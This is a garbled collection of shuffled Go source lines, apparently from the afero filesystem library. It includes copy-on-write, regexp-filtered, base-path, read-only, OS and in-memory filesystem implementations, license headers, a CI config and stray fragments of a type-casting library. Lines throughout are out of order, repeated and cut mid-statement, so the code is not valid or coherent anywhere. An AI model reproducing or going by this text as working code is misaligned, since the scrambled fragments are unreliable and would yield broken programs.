CacheOnReadFs) Remove(name string) error {
"// present in the overlay and in base, base file is newer:"
bfh.Close()
"return cacheStale, bfi, nil"
os.O_CREATE
"return u.layer.MkdirAll(name, perm) // yes, MkdirAll... we cannot assume it exists in the cache"
cacheStale
"return cacheMiss, nil, nil"
// happens if someone writes directly to the overlay without
"isaDir, err = IsDir(u.layer, dir)"
"""path/filepath"""
"return nil, "
// by the union which are the intersection of the following...
if ok1 {
"CopyOnWriteFs) Rename(oldname, newname string) error {"
if err == nil {
return syscall.EEXIST
os.PathError)
if ok2 {
layer Fs
return u.layer.Open(name)
default:
"""os"""
case syscall.ENOENT:
"CopyOnWriteFs) Mkdir(name string, perm os.FileMode) error {"
"return true, err"
"CopyOnWriteFs) Chtimes(name string, atime, mtime time.Time) error {"
"b, err := u.isBaseFile(oldname)"
if err := u.copyToLayer(name)
err = e.Err
"return false, nil"
type CopyOnWriteFs struct {
"return nil, b, err"
 !os.IsNotExist(err) {
"dir, err := IsDir(u.layer, name)"
"_, err := u.base.Stat(name)"
// This function handles the 9 different possibilities caused
// Removing files present only in the base layer is not permitted. If
"// is not present in the overlay will copy the file to the overlay (""changing"""
// Returns true if the file is not in the overlay
func (u 
"b, err := u.isBaseFile(name)"
 layer are directories
"return u.base.OpenFile(name, flag, perm)"
"CopyOnWriteFs) Open(name string) (File, error) {"
return syscall.EPERM
"bfile, bErr := u.base.Open(name)"
if dir {
// The CopyOnWriteFs is a union filesystem: a read only base file system with
"// If overlay is a file, return it (base state irrelevant)"
CopyOnWriteFs) Remove(name string) error {
"// If overlay doesn't exist, return the base (base state irrelevant)"
"UnionFile{Base: bfile, Layer: lfile}, nil"
"lbase, ok2 := u.base.(Lstater)"
"return u.layer.Chmod(name, mode)"
"lfile, lErr := u.layer.Open(name)"
os.O_RDWR
if err = u.copyToLayer(name)
CopyOnWriteFs) RemoveAll(name string) error {
"""syscall"""
// Since the overlay overrides the base we check that first
// be made in the overlay: Changing an existing file in the base layer which
"if oerr, ok := err.("
"CopyOnWriteFs) OpenFile(name string, flag int, perm os.FileMode) (File, error) {"
"CopyOnWriteFs) LstatIfPossible(name string) (os.FileInfo, bool, error) {"
"func NewCopyOnWriteFs(base Fs, layer Fs) Fs {"
return u.base.Stat(name)
// a possibly writeable layer on top. Changes to the file system will only
if err == syscall.ENOENT {
if !u.isNotExist(err) {
if err != nil 
base  Fs
(os.O_WRONLY
"llayer, ok1 := u.layer.(Lstater)"
"dir, err := IsDir(u.base, name)"
"return copyToLayer(u.base, u.layer, name)"
"if err = u.layer.MkdirAll(dir, 0777)"
 err != nil {
if oerr.Err == os.ErrNotExist 
return err
os.O_TRUNC
"//  base:  doesn't exist, exists as a file, and exists as a directory"
 oerr.Err == syscall.ENOTDIR {
if err != nil {
return true
CopyOnWriteFs) copyToLayer(name string) error {
dir := filepath.Dir(name)
os.O_TRUNC) != 0 {
 ok {
"CopyOnWriteFs) Stat(name string) (os.FileInfo, error) {"
"CopyOnWriteFs) Chmod(name string, mode os.FileMode) error {"
"CopyOnWriteFs) MkdirAll(name string, perm os.FileMode) error {"
"""fmt"""
"fi, b, err := llayer.LstatIfPossible(name)"
import (
"return nil, fmt.Errorf(""BaseErr: %v"
package afero
 lErr != nil {
"isaDir, err := IsDir(u.base, dir)"
"return fi, nil"
"// Overlay is a directory, base state now matters."
// If either have errors at this point something is very wrong. Return nil and the errors
"if _, err := u.layer.Stat(name)"
"// If base is file or nonreadable, return overlay"
"CopyOnWriteFs) isBaseFile(name string) (bool, error) {"
switch err {
CopyOnWriteFs) isNotExist(err error) bool {
if err == os.ErrNotExist 
"return u.layer.OpenFile(name, flag, perm)"
// Base state has 3 states to check but 2 outcomes:
"os.PathError{Op: ""open"", Path: name, Err: syscall.ENOTDIR} // ...or os.ErrNotExist"
if !dir 
"return u.layer.Chtimes(name, atime, mtime)"
"return fi, b, nil"
 err == syscall.ENOENT 
 err == syscall.ENOTDIR {
"return u.layer.MkdirAll(name, perm)"
"os.O_RDWR, 0666)"
return syscall.ENOENT
// Both base 
 oerr.Err == syscall.ENOENT 
"""time"""
"return u.OpenFile(name, os.O_CREATE"
if !dir {
return 
"fi, b, err := lbase.LstatIfPossible(name)"
"return nil, err"
"nOverlayErr: %v"", bErr, lErr)"
isNotExist := u.isNotExist(err)
"return u.layer.Rename(oldname, newname)"
err := u.layer.RemoveAll(name)
// A. It's a file or non-readable in the base (return just the overlay)
os.O_APPEND
// will be removed.
return u.base.Open(name)
"if e, ok := err.("
"// Reading directories is currently only supported via Open(), not OpenFile()."
if isNotExist {
// includes also calls to e.g. Chtimes() and Chmod()).
return false
"dir, err = IsDir(u.base, name)"
if bErr != nil 
if flag
"CopyOnWriteFs) Create(name string) (File, error) {"
 err == nil {
"fi, err := u.layer.Stat(name)"
"return fi, false, err"
CopyOnWriteFs)(nil)
"// a file is present in the base layer and the overlay, only the overlay"
"return ""CopyOnWriteFs"""
if b {
"_, err = u.base.Stat(name)"
"//  layer: doesn't exist, exists as a file, and exists as a directory"
os.O_CREATE
CopyOnWriteFs) Name() string {
"fi, err := u.Stat(name)"
// B. It's an accessible directory in the base (return a UnionFile)
var _ Lstater = (
err := u.layer.Remove(name)
"CopyOnWriteFs{base: base, layer: layer}"
// Renaming files present only in the base layer is not permitted
// Return union file (if opens are without error)
if isaDir {
// limitations under the License.
"func walk(fs Fs, path string, info os.FileInfo, walkFn filepath.WalkFunc) error {"
"filename := filepath.Join(path, name)"
"return nil, err"
"""path/filepath"""
return fs.Stat(path)
"// if the filesystem supports it, use Lstat, else use fs.Stat"
import (
"for _, name := range names {"
package afero
// readDirNames reads the directory named by dirname and returns
 err != filepath.SkipDir {
"return walkFn(path, info, err)"
"if lfs, ok := fs.(Lstater)"
if !info.IsDir() {
 err != nil 
"return fi, err"
if info.IsDir() 
"return names, nil"
if !fileInfo.IsDir() 
"f, err := fs.Open(dirname)"
// Copyright 
"names, err := readDirNames(fs, path)"
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
sort.Strings(names)
"err = walk(fs, filename, fileInfo, walkFn)"
"fileInfo, err := lstatIfPossible(fs, filename)"
"fi, _, err := lfs.LstatIfPossible(path)"
"""os"""
"func Walk(fs Fs, root string, walkFn filepath.WalkFunc) error {"
// See the License for the specific language governing permissions and
"return walkFn(root, nil, err)"
// and directories are filtered by walkFn. The files are walked in lexical
"func (a Afero) Walk(root string, walkFn filepath.WalkFunc) error {"
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
return nil
"// order, which makes the output deterministic but means that for very"
// large directories Walk can be inefficient.
"if err := walkFn(filename, fileInfo, err)"
"names, err := f.Readdirnames(-1)"
"// Unless required by applicable law or agreed to in writing, software"
"return walk(fs, root, info, walkFn)"
"// walk recursively descends path, calling walkFn"
2015 The Go Authors
// a sorted list of directory entries.
"info, err := lstatIfPossible(fs, root)"
return err
"// Walk walks the file tree rooted at root, calling walkFn for each file or"
} else {
"return Walk(a.Fs, root, walkFn)"
// Walk does not follow symbolic links.
// You may obtain a copy of the License at
// adapted from https://golang.org/src/path/filepath/path.go
"""sort"""
//     http://www.apache.org/licenses/LICENSE-2.0
// you may not use this file except in compliance with the License.
if err != nil {
f.Close()
"func lstatIfPossible(fs Fs, path string) (os.FileInfo, error) {"
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
"err := walkFn(path, info, nil)"
 err == filepath.SkipDir {
 ok {
"func readDirNames(fs Fs, dirname string) ([]string, error) {"
"// directory in the tree, including root. All errors that arise visiting files"
2015 Steve Francia <spf@spf13.com>
"RegexpFs) Chmod(name string, mode os.FileMode) error {"
"RegexpFs) Open(name string) (File, error) {"
"dir, err := IsDir(r.source, p)"
return f.f.Sync()
return r.source.Remove(name)
if err := r.matchesName(name)
if err := r.dirOrMatches(name)
if err := r.matchesName(oldname)
"""os"""
if err := r.matchesName(newname)
"RegexpFile) Write(s []byte) (int, error) {"
return r.source.Stat(name)
return nil
"for _, s := range fi {"
var rfi []os.FileInfo
"return ""RegexpFs"""
RegexpFile) Sync() error {
source Fs
if dir {
return r.source.Create(name)
"func NewRegexpFs(source Fs, re "
"RegexpFile) Read(s []byte) (int, error) {"
"return r.source.MkdirAll(n, p)"
type RegexpFile struct {
re     
return r.source.RemoveAll(p)
RegexpFile) Name() string {
if r.re.MatchString(name) {
"dir, err := IsDir(r.source, oldname)"
"RegexpFs) MkdirAll(n string, p os.FileMode) error {"
type RegexpFs struct {
RegexpFs) RemoveAll(p string) error {
return f.f.Stat()
"""syscall"""
"return f.f.Seek(o, w)"
"RegexpFs) Chtimes(name string, a, m time.Time) error {"
"return r.source.Rename(oldname, newname)"
"RegexpFile) Seek(o int64, w int) (int64, error) {"
"// ""No such file or directory"")."
"""regexp"""
"return r.source.Chtimes(name, a, m)"
// The RegexpFs filters files (not directories) by regular expression. Only
"RegexpFile) ReadAt(s []byte, o int64) (int, error) {"
"f, err := r.source.Open(name)"
"return r.source.OpenFile(name, flag, perm)"
RegexpFs) matchesName(name string) error {
 err != nil {
return err
return f.f.Write(s)
 f.re.MatchString(i.Name()) {
"fi = append(fi, i)"
return f.f.Read(s)
"RegexpFile{f: f, re: r.re}, nil"
"n = append(n, s.Name())"
if err != nil {
"RegexpFs) Mkdir(n string, p os.FileMode) error {"
"RegexpFile) WriteString(s string) (int, error) {"
if i.IsDir() 
"RegexpFs) Rename(oldname, newname string) error {"
import (
package afero
"RegexpFile) Readdir(c int) (fi []os.FileInfo, err error) {"
"return fi, nil"
"fi, err := f.Readdir(c)"
return f.f.Truncate(s)
"rfi, err = f.f.Readdir(c)"
"RegexpFs) Create(name string) (File, error) {"
RegexpFs) Remove(name string) error {
"return r.source.Chmod(name, mode)"
"RegexpFile) Stat() (os.FileInfo, error) {"
"RegexpFile) Readdirnames(c int) (n []string, err error) {"
if r.re == nil {
return syscall.ENOENT
"RegexpFile) WriteAt(s []byte, o int64) (int, error) {"
RegexpFile) Truncate(s int64) error {
return f.f.WriteString(s)
RegexpFs) Name() string {
return f.f.Name()
"""time"""
f  File
if err := r.matchesName(p)
"return r.source.Mkdir(n, p)"
if !dir {
return 
func (f 
"return n, nil"
"RegexpFs{source: source, re: re}"
"return nil, err"
"return f.f.WriteAt(s, o)"
return f.f.Close()
"RegexpFs) OpenFile(name string, flag int, perm os.FileMode) (File, error) {"
"// files matching the given regexp will be allowed, all others get a ENOENT error ("
RegexpFile) Close() error {
return r.matchesName(name)
"for _, i := range rfi {"
regexp.Regexp) Fs {
"RegexpFs) Stat(name string) (os.FileInfo, error) {"
regexp.Regexp
func (r 
RegexpFs) dirOrMatches(name string) error {
"return f.f.ReadAt(s, o)"
"dir, err := IsDir(r.source, name)"
  allow_failures:
  - 1.9
"  - ""1.10"""
script:
  - go build
language: go
sudo: false
matrix:
  fast_finish: true
  - go test -race -v ./...
  - linux
  - osx
    - go: tip
  - tip
"BasePathFs) LstatIfPossible(name string) (os.FileInfo, bool, error) {"
"return nil, false, "
"""path/filepath"""
"return nil, "
// the virtual file paths all look absolute on 
"sourcef, err := b.source.Create(name)"
if err := validateBasePathName(name)
BasePathFs) RemoveAll(name string) (err error) {
"BasePathFs) Create(name string) (f File, err error) {"
"fi, err := b.source.Stat(name)"
"os.PathError{Op: ""remove_all"", Path: name, Err: err}"
"os.PathError{Op: ""chtimes"", Path: name, Err: err}"
"os.PathError{Op: ""openfile"", Path: name, Err: err}"
BasePathFs)(nil)
"""os"""
BasePathFs) Remove(name string) (err error) {
"os.PathError{Op: ""create"", Path: name, Err: err}"
"os.PathError{Op: ""stat"", Path: name, Err: err}"
return nil
"BasePathFs) Chtimes(name string, atime, mtime time.Time) (err error) {"
"os.PathError{Op: ""mkdir"", Path: name, Err: err}"
func (b 
"// on a file outside the base path it returns the given file name and an error,"
// Any file name (after filepath.Clean()) outside this base path will be
return b.source.Remove(name)
"name, err := b.RealPath(name)"
source Fs
"BasePathFs) MkdirAll(name string, mode os.FileMode) (err error) {"
return b.source.RemoveAll(name)
"""strings"""
"if name, err = b.RealPath(name)"
"return name, err"
"func NewBasePathFs(source Fs, path string) Fs {"
"if oldname, err = b.RealPath(oldname)"
"os.PathError{Op: ""lstat"", Path: name, Err: err}"
path   string
"return path, nil"
BasePathFs) Name() string {
"return name, os.ErrNotExist"
// The BasePathFs restricts all operations to a given path within an Fs.
"return ""BasePathFs"""
"BasePathFile{File: sourcef, path: b.path}, nil"
"sourcef, err := b.source.OpenFile(name, flag, mode)"
nix.
"BasePathFs) Stat(name string) (fi os.FileInfo, err error) {"
"BasePathFs) Open(name string) (f File, err error) {"
"os.PathError{Op: ""rename"", Path: newname, Err: err}"
"BasePathFs) Rename(oldname, newname string) (err error) {"
 err != nil {
"// We could strip out the base part, but that would not be very portable."
"BasePathFs) Mkdir(name string, mode os.FileMode) (err error) {"
// reveal the real path on errors.
sourcename := f.File.Name()
"BasePathFs{source: source, path: path}"
path string
"sourcef, err := b.source.Open(name)"
type BasePathFile struct {
"os.PathError{Op: ""open"", Path: name, Err: err}"
"return strings.TrimPrefix(sourcename, filepath.Clean(f.path))"
"os.PathError{Op: ""remove"", Path: name, Err: err}"
if err != nil {
"BasePathFs) Chmod(name string, mode os.FileMode) (err error) {"
 ok {
// Not much to do here
// vim: ts=4 sw=4 noexpandtab nolist syn=go
"return b.source.Chmod(name, mode)"
import (
package afero
func validateBasePathName(name string) error {
BasePathFile) Name() string {
// The given file name to the operations on this Fs will be prepended with
"return b.source.Rename(oldname, newname)"
"return b.source.Mkdir(name, mode)"
type BasePathFs struct {
"""time"""
bpath := filepath.Clean(b.path)
"BasePathFile{sourcef, b.path}, nil"
return 
"os.PathError{Op: ""chmod"", Path: name, Err: err}"
func (f 
"return nil, err"
"BasePathFs) OpenFile(name string, flag int, mode os.FileMode) (f File, err error) {"
// On Windows a common mistake would be to provide an absolute OS path
// treated as non existing file.
"return b.source.MkdirAll(name, mode)"
"""runtime"""
"return b.source.Chtimes(name, atime, mtime)"
if filepath.IsAbs(name) {
"if newname, err = b.RealPath(newname)"
return b.source.Stat(name)
"if lstater, ok := b.source.(Lstater)"
"return fi, false, err"
"path = filepath.Clean(filepath.Join(bpath, name))"
"// Note that it does not clean the error messages on return, so you may"
"if !strings.HasPrefix(path, bpath) {"
return lstater.LstatIfPossible(name)
return os.ErrNotExist
// else the given file with the base path prepended
// the base path before calling the base Fs.
var _ Lstater = (
"os.PathError{Op: ""rename"", Path: oldname, Err: err}"
File
"if runtime.GOOS != ""windows"" {"
"BasePathFs) RealPath(name string) (path string, err error) {"
"ReadOnlyFs) ReadDir(name string) ([]os.FileInfo, error) {"
"ReadOnlyFs) Stat(name string) (os.FileInfo, error) {"
return lsf.LstatIfPossible(name)
import (
package afero
"ReadOnlyFs) Rename(o, n string) error {"
os.O_APPEND
"""syscall"""
ReadOnlyFs) RemoveAll(p string) error {
type ReadOnlyFs struct {
"if lsf, ok := r.source.(Lstater)"
"""os"""
"fi, err := r.Stat(name)"
return r.source.Stat(name)
ReadOnlyFs) Remove(n string) error {
"ReadOnlyFs) Create(n string) (File, error) {"
func NewReadOnlyFs(source Fs) Fs {
"ReadOnlyFs) Mkdir(n string, p os.FileMode) error {"
if flag
(os.O_WRONLY
"return r.source.OpenFile(name, flag, perm)"
"ReadOnlyFs) OpenFile(name string, flag int, perm os.FileMode) (File, error) {"
"ReadOnlyFs) MkdirAll(n string, p os.FileMode) error {"
"return fi, false, err"
syscall.O_RDWR
"ReadOnlyFs) Open(n string) (File, error) {"
"return ReadDir(r.source, name)"
func (r 
source Fs
ReadOnlyFs) Name() string {
"return ""ReadOnlyFilter"""
"ReadOnlyFs) Chmod(n string, m os.FileMode) error {"
return syscall.EPERM
os.O_CREATE
ReadOnlyFs)(nil)
var _ Lstater = (
return r.source.Open(n)
ReadOnlyFs{source: source}
"""time"""
"ReadOnlyFs) LstatIfPossible(name string) (os.FileInfo, bool, error) {"
os.O_TRUNC) != 0 {
"return nil, syscall.EPERM"
return 
 ok {
"ReadOnlyFs) Chtimes(n string, a, m time.Time) error {"
// limitations under the License.
"// In addtion to the FileInfo, it will return a boolean telling whether Lstat was called or not."
import (
package afero
// Lstater is an optional interface in Afero. It is only implemented by the
// Copyright 
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"""os"""
// See the License for the specific language governing permissions and
"// It will call Lstat if the filesystem iself is, or it delegates to, the os filesystem."
// http://www.apache.org/licenses/LICENSE-2.0
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
"// Unless required by applicable law or agreed to in writing, software"
// Else it will call Stat.
type Lstater interface {
 2018 Steve Francia <spf@spf13.com>.
// You may obtain a copy of the License at
// you may not use this file except in compliance with the License.
"LstatIfPossible(name string) (os.FileInfo, bool, error)"
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
// filesystems saying so.
// Rename renames a file.
// (cross platform) and an interface that should be implemented if you want to
"Mkdir(name string, perm os.FileMode) error"
"Open(name string) (File, error)"
"""os"""
// provide your own filesystem.
"ErrTooLarge          = errors.New(""Too large"")"
// yet.
// you may not use this file except in compliance with the License.
"""errors"""
"// Mkdir creates a directory in the filesystem, return an error if any"
// OpenFile opens a file using the given flags and the given mode.
"Chmod(name string, mode os.FileMode) error"
io.Closer
"// uses the operating system filesystem, one that uses memory to store files"
// happens.
"Readdir(count int) ([]os.FileInfo, error)"
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
// http://www.apache.org/licenses/LICENSE-2.0
Truncate(size int64) error
// The name of this FileSystem
io.Seeker
"ErrFileClosed        = errors.New(""File is closed"")"
// File represents a file in the filesystem.
"// Unless required by applicable law or agreed to in writing, software"
"// error, if any happens."
type Fs interface {
Remove(name string) error
// Copyright 2013 tsuru authors. All rights reserved.
"ErrOutOfRange        = errors.New(""Out of range"")"
io.ReaderAt
// does not fail if the path does not exist (return nil).
// You may obtain a copy of the License at
"Create(name string) (File, error)"
//Chmod changes the mode of the named file to mode.
// Afero also provides a few implementations that are mostly interoperable. One that
"// Package afero provides types and methods for interacting with the filesystem,"
// limitations under the License.
import (
type Afero struct {
package afero
 2014 Steve Francia <spf@spf13.com>.
"// Remove removes a file identified by name, returning an error, if any"
// MkdirAll creates a directory path and all parents that does not exist
// Copyright 
// Fs is the filesystem interface.
io.Writer
"Stat() (os.FileInfo, error)"
"// Open opens a file, returning it or an error, if any happens."
ErrDestinationExists = os.ErrExist
"WriteString(s string) (ret int, err error)"
// Any simulated or real filesystem should implement this interface.
"// Stat returns a FileInfo describing the named file, or an error, if any"
"// Create creates a file in the filesystem, returning the file and an"
ErrFileExists        = os.ErrExist
"Stat(name string) (os.FileInfo, error)"
"OpenFile(name string, flag int, perm os.FileMode) (File, error)"
"""time"""
//Chtimes changes the access and modification times of the named file
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
ErrFileNotFound      = os.ErrNotExist
Sync() error
// RemoveAll removes a directory path and any children it contains. It
// as an abstraction layer.
"MkdirAll(path string, perm os.FileMode) error"
io.WriterAt
// See the License for the specific language governing permissions and
Name() string
"Chtimes(name string, atime time.Time, mtime time.Time) error"
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
"Rename(oldname, newname string) error"
RemoveAll(path string) error
"""io"""
io.Reader
type File interface {
"Readdirnames(n int) ([]string, error)"
var (
// limitations under the License.
// a nil value of type 
"func (OsFs) Open(name string) (File, error) {"
"func (OsFs) OpenFile(name string, flag int, perm os.FileMode) (File, error) {"
os.File or nil won't be nil
"return os.Rename(oldname, newname)"
"func (OsFs) Mkdir(name string, perm os.FileMode) error {"
import (
func (OsFs) Remove(name string) error {
package afero
type OsFs struct{}
 2014 Steve Francia <spf@spf13.com>.
"f, e := os.OpenFile(name, flag, perm)"
if f == nil {
"return f, e"
"func (OsFs) Stat(name string) (os.FileInfo, error) {"
"func (OsFs) MkdirAll(path string, perm os.FileMode) error {"
OsFs)(nil)
func NewOsFs() Fs {
"return os.Chmod(name, mode)"
// Copyright 
"return os.MkdirAll(path, perm)"
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"func (OsFs) LstatIfPossible(name string) (os.FileInfo, bool, error) {"
"""os"""
"// while this looks strange, we need to return a bare nil (of type nil) not"
"return nil, e"
"f, e := os.Create(name)"
return os.RemoveAll(path)
// See the License for the specific language governing permissions and
"func (OsFs) Chtimes(name string, atime time.Time, mtime time.Time) error {"
"func (OsFs) Create(name string) (File, error) {"
// http://www.apache.org/licenses/LICENSE-2.0
"return os.Mkdir(name, perm)"
"return os.Chtimes(name, atime, mtime)"
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
"fi, err := os.Lstat(name)"
"// Unless required by applicable law or agreed to in writing, software"
"func (OsFs) Rename(oldname, newname string) error {"
"f, e := os.Open(name)"
func (OsFs) RemoveAll(path string) error {
// Copyright 2013 tsuru authors. All rights reserved.
"return fi, true, err"
// OsFs is a Fs implementation that uses functions provided by the os package.
// You may obtain a copy of the License at
return os.Remove(name)
"func (OsFs) Chmod(name string, mode os.FileMode) error {"
// you may not use this file except in compliance with the License.
"func (OsFs) Name() string { return ""OsFs"" }"
var _ Lstater = (
"""time"""
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
return 
OsFs{}
return os.Stat(name)
"// For details in any method, check the documentation of the os package"
// (http://golang.org/pkg/os/).
module github.com/spf13/afero
// limitations under the License.
sort.Sort(filesSorter(files))
"FileData) { delete(m, f.name) }"
FileData
"func (s filesSorter) Swap(i, j int)      { s[i], s[j] = s[j], s[i] }"
"import ""sort"""
func (m DirMap) Len() int           { return len(m) }
return names
type DirMap map[string]
// Copyright 
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
func (m DirMap) Names() (names []string) {
"names = append(names, x)"
"for _, f := range m {"
// See the License for the specific language governing permissions and
// http://www.apache.org/licenses/LICENSE-2.0
FileData) {
"files = append(files, f)"
func (m DirMap) Add(f 
type filesSorter []
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
FileData)    { m[f.name] = f }
package mem
 2015 Steve Francia <spf@spf13.com>.
"// Unless required by applicable law or agreed to in writing, software"
func (s filesSorter) Len() int           { return len(s) }
func (m DirMap) Remove(f 
// You may obtain a copy of the License at
// implement sort.Interface for []
"func (s filesSorter) Less(i, j int) bool { return s[i].name < s[j].name }"
return files
// you may not use this file except in compliance with the License.
func (m DirMap) Files() (files []
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
for x := range m {
func GetFileInfo(f 
atomic.StoreInt64(
if !f.readOnly {
"""path/filepath"""
if int(f.at) > len(f.fileData.data) {
"return nil, "
"File) Seek(offset int64, whence int) (int64, error) {"
return s.dir
f.Lock()
FileInfo{f.fileData}
var tail []byte
readOnly     bool
"setModTime(f.fileData, time.Now())"
"File{fileData: data, readOnly: true}"
var outLength int64
defer f.fileData.Unlock()
FileInfo) Sys() interface{} { return nil }
diff := cur - int64(len(f.fileData.data))
"FileData, newname string) {"
for i := range res {
"""os"""
func CreateFile(name string) 
"""sync/atomic"""
"res = make([]os.FileInfo, outLength)"
s.Unlock()
modtime time.Time
func ChangeFileName(f 
return nil
files := f.fileData.memDir.Files()[f.readDirCount:]
diff := size - int64(len(f.fileData.data))
tail = f.fileData.data[n
"""bytes"""
 2015 Steve Francia <spf@spf13.com>.
err = io.EOF
"f.at, int64(len(f.fileData.data)))"
f.closed = true
= outLength
return f.Write(b)
if f.closed == true {
"return names, err"
"f.at, int64(len(f.fileData.data))"
if n
"ErrTooLarge          = errors.New(""Too large"")"
FileData {
cur := atomic.LoadInt64(
// Implements os.FileInfo
// you may not use this file except in compliance with the License.
"""errors"""
case 1:
type FileData struct {
dir     bool
f.fileData.data = f.fileData.data[0:size]
const FilePathSeparator = string(filepath.Separator)
"_, names[i] = filepath.Split(f.Name())"
"os.PathError{Op: ""truncate"", Path: f.fileData.name, Err: errors.New(""file handle is read only"")}"
"return 0, ErrFileClosed"
"return 0, "
"f.fileData.data = append(f.fileData.data, bytes.Repeat([]byte{00}, int(diff))...)"
return ErrFileClosed
"f.at, off)"
offset)
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
func setModTime(f 
"FileData, mode os.FileMode) {"
FileInfo) Mode() os.FileMode {
fileData     
// http://www.apache.org/licenses/LICENSE-2.0
if size < 0 {
return ErrOutOfRange
File) Truncate(size int64) error {
return d.name
if count > 0 {
"ErrFileClosed        = errors.New(""File is closed"")"
"// Unless required by applicable law or agreed to in writing, software"
"FileInfo{f.fileData}, nil"
// Copyright 2013 tsuru authors. All rights reserved.
name    string
"FileData{name: name, memDir: "
sync.Mutex
FileInfo {
"FileData, mtime time.Time) {"
} else {
"ErrOutOfRange        = errors.New(""Out of range"")"
"File) Write(b []byte) (n int, err error) {"
f.mode = mode
return int64(len(s.data))
File) Close() error {
// You may obtain a copy of the License at
f.readDirCount 
"f.readDirCount, 0)"
"fi, err := f.Readdir(n)"
FileInfo{f}
"f.at, int64(offset))"
"return f.at, nil"
"f.at, offset)"
if len(f.fileData.data)-int(f.at) >= len(b) {
func NewFileHandle(data 
func NewReadOnlyFileHandle(data 
f.fileData.Unlock()
f.at)
// limitations under the License.
"DirMap{}, dir: true}"
"return 0, io.ErrUnexpectedEOF"
 int(f.at) == len(f.fileData.data) {
import (
case 0:
mode    os.FileMode
func CreateDir(name string) 
func SetModTime(f 
data    []byte
// atomic requires 64-bit alignment for struct field access
"File) Read(b []byte) (n int, err error) {"
// Copyright 
readDirCount int64
outLength = int64(len(files))
if len(files) < count {
"File) Readdirnames(n int) (names []string, err error) {"
"return res, err"
return f.Write([]byte(s))
File {
FileInfo) Name() string {
s.Lock()
return int64(42)
"f.fileData.data = append(f.fileData.data[:cur], b...)"
"File) Stat() (os.FileInfo, error) {"
"setModTime(f, mtime)"
ErrDestinationExists = os.ErrExist
defer d.Unlock()
"f.fileData.data = append(bytes.Repeat([]byte{00}, int(diff)), b...)"
if len(b) > 0 
"FileData{name: name, mode: os.ModeTemporary, modtime: time.Now()}"
"return 0, io.EOF"
"for i, f := range fi {"
ErrFileExists        = os.ErrExist
memDir  Dir
"_, name := filepath.Split(s.name)"
type FileInfo struct {
return f.Read(b)
"names = make([]string, len(fi))"
"File) WriteAt(b []byte, off int64) (n int, err error) {"
func (f File) Data() 
"os.PathError{Op: ""readdir"", Path: f.fileData.name, Err: errors.New(""not a dir"")}"
File{fileData: data}
func (d 
at           int64
if s.IsDir() {
FileInfo{files[i]}
f.Unlock()
f.closed = false
File) Open() error {
"f.at, 0)"
if diff > 0 {
if size > int64(len(f.fileData.data)) {
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
return 
ErrFileNotFound      = os.ErrNotExist
int64(n)])
func (f 
FileData
if !f.fileData.dir {
FileInfo) IsDir() bool {
"copy(b, f.fileData.data[f.at:f.at"
"File) ReadAt(b []byte, off int64) (n int, err error) {"
int(cur) < len(f.fileData.data) {
f.modtime = mtime
type File struct {
d.Lock()
"import ""time"""
// See the License for the specific language governing permissions and
File) Name() string {
File) Sync() error {
return s.modtime
atomic.AddInt64(
FileInfo) ModTime() time.Time {
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
"f.fileData.data = append(f.fileData.data, tail...)"
case 2:
package mem
"""io"""
"File) WriteString(s string) (ret int, err error) {"
switch whence {
FileData) Name() string {
"os.PathError{Op: ""write"", Path: f.fileData.name, Err: errors.New(""file handle is read only"")}"
File) Info() 
"File) Readdir(count int) (res []os.FileInfo, err error) {"
"""sync"""
return name
func (s 
return f.fileData
res[i] = 
closed       bool
defer s.Unlock()
return
func SetMode(f 
n = len(b)
if len(files) == 0 {
f.fileData.Lock()
return s.mode
n = len(f.fileData.data) - int(f.at)
int(cur):]
var (
return f.fileData.Name()
f.name = newname
FileData) 
if f.readOnly {
"f.at, int64(n))"
FileInfo) Size() int64 {
outLength = int64(count)
// limitations under the License.
FileData
func RemoveFromMemDir(dir 
 2014 Steve Francia <spf@spf13.com>.
dir.memDir.Remove(f)
Len() int
// Copyright 
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
// See the License for the specific language governing permissions and
// http://www.apache.org/licenses/LICENSE-2.0
type Dir interface {
FileData) {
d.memDir = 
Remove(
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
"FileData, f "
package mem
"// Unless required by applicable law or agreed to in writing, software"
Add(
FileData)
if d.memDir == nil {
func AddToMemDir(dir 
dir.memDir.Add(f)
Names() []string
// You may obtain a copy of the License at
// you may not use this file except in compliance with the License.
func InitializeDir(d 
Files() []
DirMap{}
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
d.dir = true
case []int:
case map[string][]interface{}:
"""2006-01-02 15:04:05Z0700"",  // RFC3339 without T or timezone hh:mm colon"
default:
"return time.Unix(v, 0), nil"
"return []bool{}, fmt.Errorf(""unable to cast %"
for v.Kind() == reflect.Ptr 
case []interface{}:
var m = map[string]int{}
"v of type %T to int32"", i, i)"
"case reflect.Slice, reflect.Array:"
func indirect(a interface{}) interface{} {
case template.HTML:
"v of type %T to []int"", i, i)"
"return float32(s), nil"
"v of type %T to Time"", i, i)"
 !v.Type().Implements(errorType) 
"""2006-01-02 15:04:05 -0700"","
"v of type %T to []interface{}"", i, i)"
// ToDurationSliceE casts an interface to a []time.Duration type.
"func ToTimeE(i interface{}) (tim time.Time, err error) {"
"return string(s), nil"
"v of type %T to uint"", i, i)"
"""errors"""
return StringToDate(v)
"func ToInt64E(i interface{}) (int64, error) {"
v := reflect.ValueOf(a)
"v of type %T to map[string]string"", i, i)"
kind := reflect.TypeOf(i).Kind()
"return b, nil"
"val, err := ToDurationE(s.Index(j).Interface())"
d = time.Duration(ToInt64(s))
"func StringToDate(s string) (time.Time, error) {"
